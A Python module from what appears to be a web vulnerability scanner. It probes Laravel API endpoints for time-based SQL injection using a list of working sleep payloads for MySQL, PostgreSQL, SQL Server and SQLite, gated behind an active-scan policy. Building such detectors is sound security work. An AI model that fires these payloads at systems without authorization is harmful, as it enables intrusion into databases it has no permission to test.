#!/usr/bin/env python3
"""
Time-based SQL Injection Scanner for Laravel API Endpoints

This module detects time-based SQL injection vulnerabilities by measuring
response time delays when injecting time-delay SQL payloads into API parameters.
"""

import requests
import time
from urllib.parse import urljoin, quote
from typing import Dict, List, Optional, Union

from modules.core.http_config import app_url
from modules.core import http_config


# Time-based SQLi is an ACTIVE injection, so it only runs under --allow-active / the
# exploit pipeline (gated at the request layer below). Coverage spans the four engines
# a Laravel app actually uses — MySQL/MariaDB, PostgreSQL, SQLite, SQL Server — instead
# of the old MSSQL-only WAITFOR that was a guaranteed no-op on the common stacks.
_SLEEP_SECONDS = 5
_DELAY_THRESHOLD = 4.0  # seconds of induced delay to call a timing hit
_ENDPOINTS = ("/api/data", "/api/users", "/api/search", "/api/items")
_PARAMS = ("id", "user_id", "q", "search")

# Each template takes {s} = sleep seconds. A hit is confirmed differentially: the
# {s}=5 payload must be slow AND the same payload with {s}=0 must be fast, so a
# uniformly-slow endpoint or network jitter does not read as injection.
_PAYLOAD_TEMPLATES = (
    ("mysql", "1 AND SLEEP({s})"),
    ("mysql", "1' AND SLEEP({s})-- -"),
    ("mysql", "1) AND SLEEP({s})-- -"),
    ("postgres", "1; SELECT pg_sleep({s})-- -"),
    ("postgres", "1' AND 1=(SELECT 1 FROM pg_sleep({s}))-- -"),
    ("mssql", "1; WAITFOR DELAY '0:0:{s}'-- -"),
    ("mssql", "1'; WAITFOR DELAY '0:0:{s}'-- -"),
    ("sqlite", "1 AND 1=(SELECT 1 WHERE {s}=0 OR randomblob(100000000))"),
)


def _timing_confirms(baseline: float, slow: float, fast: float,
                     threshold: float = _DELAY_THRESHOLD) -> bool:
    """Differential decision: the sleep(N) payload induced >= threshold delay while the
    sleep(0) control of the SAME payload stayed well under it. Rejects slow endpoints
    (both high) and jitter (control also high)."""
    return (slow - baseline) >= threshold and (fast - baseline) < (threshold * 0.6)


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs) -> Optional[Dict[str, Union[str, float]]]:
    """Scan for time-based SQL injection across MySQL/PostgreSQL/SQLite/MSSQL dialects.

    ACTIVE probe: gated so it only runs under --allow-active / --exploit; under the
    default passive ceiling the injection requests raise RequestBlocked, surfaced as a
    'blocked_by_policy' verdict. A hit is confirmed with a sleep(0) control to suppress
    false positives. Returns a finding dict (proof_type=behavioral) or None.
    """
    if not target_url:
        return None

    sess = session or http_config.get_auth_session()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    target_url = target_url.rstrip('/')

    headers = {
        'User-Agent': http_config.BROWSER_USER_AGENT,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    }

    try:
        # Injection is ACTIVE — the whole sweep runs under the active ceiling so a plain
        # (passive) scan blocks here instead of firing sleep payloads at the target.
        with http_config.request_tier(http_config.ACTIVE):
            # Explicit gate so the sweep never issues a single timing payload under the
            # passive ceiling (independent of session type / internal error-swallowing).
            http_config.guard_nonhttp(http_config.ACTIVE, "time-based SQLi sweep")
            for api_path in _ENDPOINTS:
                baseline_url = app_url(target_url, api_path) + '?id=1'
                baseline = _measure_response_time(baseline_url, headers, sess)
                if baseline is None:
                    continue  # endpoint unreachable — try the next
                for param in _PARAMS:
                    for dialect, template in _PAYLOAD_TEMPLATES:
                        slow_payload = template.format(s=_SLEEP_SECONDS)
                        slow_url = app_url(target_url, api_path) + f'?{param}={quote(slow_payload)}'
                        slow = _measure_response_time(slow_url, headers, sess)
                        if slow is None or (slow - baseline) < _DELAY_THRESHOLD:
                            continue
                        # Candidate: confirm differentially with the sleep(0) control.
                        fast_payload = template.format(s=0)
                        fast_url = app_url(target_url, api_path) + f'?{param}={quote(fast_payload)}'
                        fast = _measure_response_time(fast_url, headers, sess)
                        if fast is None:
                            continue
                        if _timing_confirms(baseline, slow, fast):
                            return {
                                "path": api_path,
                                "param": param,
                                "dialect": dialect,
                                "url": slow_url,
                                "delay": slow - baseline,
                                "baseline_time": baseline,
                                "injection_time": slow,
                                "control_time": fast,
                                "vulnerable": True,
                                "verdict": "confirmed_vulnerable",
                                "proof_type": "behavioral",
                                "vuln_class": "sqli",
                                "severity": "High",
                            }
    except http_config.RequestBlocked:
        # Surface the tier gate as a visible blocked_by_policy verdict via _safe_scan.
        raise
    except Exception:
        pass

    return None


def _measure_response_time(url: str, headers: Dict[str, str], sess) -> Optional[float]:
    """
    Measure response time for a given URL.

    Args:
        url (str): The URL to test
        headers (Dict[str, str]): Request headers
        sess: The requests session used to issue the request

    Returns:
        Optional[float]: Response time in seconds, None if request failed
    """
    try:
        start_time = time.time()

        response = sess.get(
            url,
            headers=headers,
            timeout=15,  # Higher timeout to allow for injection delays
            allow_redirects=False
        )
        
        end_time = time.time()
        return end_time - start_time

    except http_config.RequestBlocked:
        # Never swallow the tier gate — let scan() surface blocked_by_policy.
        raise
    except Exception:
        return None










